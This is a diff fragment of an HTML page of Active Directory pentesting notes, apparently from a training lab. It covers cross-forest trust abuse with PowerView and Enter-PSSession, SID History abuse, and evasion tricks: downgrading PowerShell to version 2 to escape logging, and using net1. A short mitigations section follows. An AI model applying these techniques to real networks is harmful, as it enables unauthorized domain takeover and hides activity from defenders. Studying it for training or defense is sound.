+<span class="normal"><a href="#__codelineno-86-2">2</a></span>
+<span class="normal"><a href="#__codelineno-86-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1"></a><span class="nb">Get-DomainForeignGroupMember</span> <span class="n">-Domain</span> <span class="nv">$targeteddomain</span>
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2"></a><span class="c"># Example:</span>
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3"></a><span class="c"># Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Results:
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-87-1">1</a></span>
+<span class="normal"><a href="#__codelineno-87-2">2</a></span>
+<span class="normal"><a href="#__codelineno-87-3">3</a></span>
+<span class="normal"><a href="#__codelineno-87-4">4</a></span>
+<span class="normal"><a href="#__codelineno-87-5">5</a></span>
+<span class="normal"><a href="#__codelineno-87-6">6</a></span>
+<span class="normal"><a href="#__codelineno-87-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1"></a>GroupDomain             : FREIGHTLOGISTICS.LOCAL
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2"></a>GroupName               : Administrators
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3"></a>GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4"></a>MemberDomain            : FREIGHTLOGISTICS.LOCAL
+</span><span id="__span-87-5"><a id="__codelineno-87-5" name="__codelineno-87-5"></a>MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+</span><span id="__span-87-6"><a id="__codelineno-87-6" name="__codelineno-87-6"></a>MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+</span><span id="__span-87-7"><a id="__codelineno-87-7" name="__codelineno-87-7"></a>                          TICS,DC=LOCAL
+</span></code></pre></div></td></tr></table></div></p>
+<p>If we convert the SID to name:
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-88-1">1</a></span>
+<span class="normal"><a href="#__codelineno-88-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1"></a><span class="nb">Convert-SidToName</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">500</span>
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2"></a><span class="c"># Results: INLANEFREIGHT\administrator</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>Meaning that the built-in Administrators group in <code>FREIGHTLOGISTICS.LOCAL</code> has the built-in Administrator account for the <code>INLANEFREIGHT.LOCAL</code> domain as a member.</p>
+<h4 id="accessing-dc03-using-enter-pssession">Accessing DC03 Using Enter-PSSession</h4>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-89-1">1</a></span>
+<span class="normal"><a href="#__codelineno-89-2">2</a></span>
+<span class="normal"><a href="#__codelineno-89-3">3</a></span>
+<span class="normal"><a href="#__codelineno-89-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="nv">$hostname</span><span class="p">.</span><span class="nv">$targeteddomain</span> <span class="n">-Credential</span> <span class="nv">$ParentDomain</span><span class="p">\</span><span class="n">administrator</span>
+</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2"></a><span class="c"># Example:</span>
+</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3"></a><span class="c"># Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</span>
+</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4"></a><span class="c"># From the command output above, we can see that we successfully authenticated to the Domain Controller in the `FREIGHTLOGISTICS.LOCAL` domain using the Administrator account from the `INLANEFREIGHT.LOCAL` domain</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="sid-history-abuse-cross-forest">SID History Abuse - Cross Forest</h3>
+<p>SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest.</p>
+<p>If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest.</p>
 <h2 id="evasion-techniques">Evasion Techniques</h2>
 <h4 id="downgrade-powershell">Downgrade Powershell</h4>
 <p>Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. </p>
 <p>With <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2">Script Block Logging</a> enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-71-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-90-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span>
 </span></code></pre></div></td></tr></table></div>
 <p>PowerShell Operational Logs are kept under under <code>Applications and Services Logs &gt; Microsoft &gt; Windows &gt; PowerShell &gt; Operational</code>.
 Also the <code>Windows PowerShell</code> log is located at <code>Applications and Services Logs &gt; Windows PowerShell</code>.</p>
 <h4 id="net-commands-trick">Net Commands Trick</h4>
 <p>Typing <code>net1</code> instead of <code>net</code> will execute the same functions without the potential trigger from the net string. Example:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-72-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1"></a><span class="n">net1</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>   
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-91-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1"></a><span class="n">net1</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>   
 </span></code></pre></div></td></tr></table></div>
 <h2 id="mitigations_1">Mitigations</h2>
 <ol>
@@ -18585,14 +18893,14 @@ Also the <code>Windows PowerShell</code> log is located at <code>Applications 
 </ol>
 <p>Enabling the <a href="https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access">Advanced Security Audit Policy</a> can help in detecting unwanted changes, especially <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136">Event ID 5136: A directory service object was modified</a> which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID <code>5136</code> created. If we check out the <code>Details</code> tab, we can see that the pertinent information is written in <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language">Security Descriptor Definition Language (SDDL)</a> which is not human readable.</p>
 <p>We can use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2">ConvertFrom-SddlString cmdlet</a> to convert this to a readable format.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-73-1">1</a></span>
-<span class="normal"><a href="#__codelineno-73-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1"></a><span class="c"># Converting the SDDL String into a Readable Format</span>
-</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2"></a><span class="nb">ConvertFrom-SddlString</span> <span class="s2">&quot;O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-[CUT]&quot;</span> 
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-92-1">1</a></span>
+<span class="normal"><a href="#__codelineno-92-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1"></a><span class="c"># Converting the SDDL String into a Readable Format</span>
+</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2"></a><span class="nb">ConvertFrom-SddlString</span> <span class="s2">&quot;O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-[CUT]&quot;</span> 
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-12-29T19:35:32+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-12-29</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-01T20:37:04+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-01</span></small></br>
 
 
     <small>Created: December 27, 2024 22:00:41</small>
